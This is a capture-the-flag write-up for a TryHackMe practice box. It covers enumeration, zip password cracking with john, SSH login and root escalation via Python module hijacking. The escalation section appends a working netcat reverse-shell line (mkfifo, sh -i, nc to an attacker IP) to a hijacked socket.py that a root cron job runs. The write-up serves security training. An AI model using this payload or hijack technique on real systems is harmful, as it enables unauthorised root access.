# THM SecDSM-Dec22-MiniCTF Writeup

​		November 22<sup>nd</sup> 2022

​		writeups@centraliowacybersec.com

​		[Box Link](https://tryhackme.com/jr/secdsmdecember22minictf)

 
## Skills Needed or Learned
1. Web Service Enumeration.
1. Cracking an encrypted zip file.
1. Linux Privesc with Permission Misconfiguration


### Description:

This is the official writeup for the box. This is my first boot2root for a public audience so feedback is highly desired! Have fun and please reach out to me for any questions related to the box!

### Difficulty: Easy

# Hosts File

`sudo nano /etc/hosts`

add a line with the remote IP and the dns entry


`<IP> secdsm.thm`

# Enumeration

Start with basic and advanced NMAP scans on the box.

`nmap -v secdsm.thm`
![image](https://user-images.githubusercontent.com/43767555/203445905-4d04de66-d01c-48f0-9407-229137a38694.png)

`nmap -p 22,80 -A -sC -sV -v secdsm.thm`
![image],(https://user-images.githubusercontent.com/43767555/203445915-0b21ff59-a63c-4ecb-8c61-27616b5fb5ab.png)

HTTP and SSH are open. HTTP is always a pretty interesting place to start.

After spending some time on the site, a lot of links don't go anywhere but one does go to a broken link which is very interesting.

![image](https://user-images.githubusercontent.com/43767555/203446098-4fd83d1b-62b0-48ab-aa63-518c8a3758bf.png)
![image](https://user-images.githubusercontent.com/43767555/203446104-ca0609f7-04f1-4e04-a431-314c465fe0e6.png)

I checked the link in burp with the same results.

There are two routes here.
1. Edit the hosts file to match the url in the broken link
1. Edit the link to point to the machiine's known IP.

![image](https://user-images.githubusercontent.com/43767555/203446466-85f0dc87-dd5d-4d88-81d1-b8de05635a98.png)

This got me a download for the file.

![image](https://user-images.githubusercontent.com/43767555/203446486-7b086bfa-12b4-49fa-822a-1b8f81d5d705.png)

# Foothold

The file is encrypted but it seems to hold something called backup.txt.

![image](https://user-images.githubusercontent.com/43767555/203446633-38e82173-bffe-4005-8558-a5e61838193f.png)
![image](https://user-images.githubusercontent.com/43767555/203446679-2d9c099d-892a-4ede-80be-2de595097022.png)

This command will only work out of the box on later versions of Kali. You can download or search for this on your machine as well.

`zip2john temp.zip > hash`
![image](https://user-images.githubusercontent.com/43767555/203447619-fba66001-9dea-459e-b14c-ff1b3813db41.png)

Next is to crack this hash with john.

`john hash --wordlist=/usr/share/wordlist/rockyou.txt`

![image](https://user-images.githubusercontent.com/43767555/203447633-1cc3421b-1cd5-427a-8e26-46856d178fff.png)

This crack was succesful!

`unzip temp.zip`
`<password>`

![image](https://user-images.githubusercontent.com/43767555/203447877-2fb0f021-cce0-4554-bd42-55ef4394cd2f.png)
![image](https://user-images.githubusercontent.com/43767555/203447889-209d36d1-c1a6-4e88-8e9f-892d19423b55.png)

This file contained what looks like user creds that we can try on the open SSH port.

Back on the Attack machine, attempt to login to the.

`ssh kinder@secdsm.thm`

![image](https://user-images.githubusercontent.com/43767555/203448008-5ecb6140-d47d-4a73-84c6-7ffdeab0f424.png)

Here we can see the user.txt file, first flag down!

![image](https://user-images.githubusercontent.com/43767555/203448073-aaf7cf10-878b-428f-9e19-0df367aa9904.png)

# Privilege Escalation

The next part comes with Linux Privesc enumeration but we need to look for Cron Jobs or follow the proccesses on the machine to see what's happeneing behind the scenes.

On the attackbox get pspy downloaded from github.

`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s`

From here we can host a temp pthon webservber to move it onto the victim machine.

`sudo python3 -m http.server 80`

![image](https://user-images.githubusercontent.com/43767555/203450435-ac957f3b-9332-422e-b93d-2fefde30d730.png)

Download it onto the victim machine.

`wget http://192.168.59.131/pspy64s && chmod 777 pspy64s`

![image](https://user-images.githubusercontent.com/43767555/203450549-725b9440-c1fe-4192-888b-ea5ce0a8cbda.png)
![image](https://user-images.githubusercontent.com/43767555/203450555-0e39858b-fbb9-4766-89f5-fe40d1b6c38f.png)

This succesfully exposed a root cron job that we couldn't see from the public /etc/crontab file.

![image](https://user-images.githubusercontent.com/43767555/203450599-59ec8156-ef63-4932-9c74-2ac168593ada.png)

This shows some interest to this globally writeable directory inside of /opt/

![image](https://user-images.githubusercontent.com/43767555/203450667-94dad0e8-3cbb-4ffc-a3e8-a6d7ff62b0c6.png)

updog.py is not globally writeable though.

I wonder what updog.py is?

`whatis updog.py`

![image](https://user-images.githubusercontent.com/43767555/203450755-e9cbb752-7951-4cdc-80f9-095713add631.png)

Oh wait, wrong command!

![image](https://user-images.githubusercontent.com/43767555/203450769-ef6eb46f-ea13-4040-83a8-2f2791c97cab.png)

It looks like this script is checking if port 80 is online on localhost. If it isn't then it restarts the apache service. This is all pretty simple but on it's own not exploitable. What is exploitable is the writeable directory the file lives in.

Python imports modules in a specific order and iut is possible to exploit this given the right parameters.
1.    The current directory (same directory as script doing the importing).
1.    The library of standard modules.
1.    The paths defined in sys.path.*

[Source](https://www.webucator.com/article/how-python-finds-imported-modules)

Let's pull in the real sockets.py file into the directory and modify it to exploit this configuration vulnerability on the machine.

`find / -name socket.py 2>/dev/null`
`cp /usr/lib/python3.10/socket.py .`


![image](https://user-images.githubusercontent.com/43767555/203451434-4f756d72-8933-4466-a17f-fe6a1e57ae2d.png)

With the file succesfully pulled into the directory we can now build a reverse shell back to the attackbox.

[Revshells.com](https://revshells.com)

![image](https://user-images.githubusercontent.com/43767555/203451481-0b4b7008-3976-4d6e-97f6-9d338cc80362.png)

I checked for nc before building the shell.

`which nc`

![image](https://user-images.githubusercontent.com/43767555/203454997-2c92d5d6-9325-4a98-9e23-89e9b2c34734.png)


`echo 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.59.131 80 >/tmp/f")' >> socket.py && tail -n 10 socket.py`

![image](https://user-images.githubusercontent.com/43767555/203455333-7cacc5bd-72e6-4a22-ad10-70cb465abe84.png)

This pops a root shell on the attackbox where the root flag can be grabbed to finish!

![image](https://user-images.githubusercontent.com/43767555/203455377-9af29b7d-8ad6-4988-97ce-8573f8344412.png)
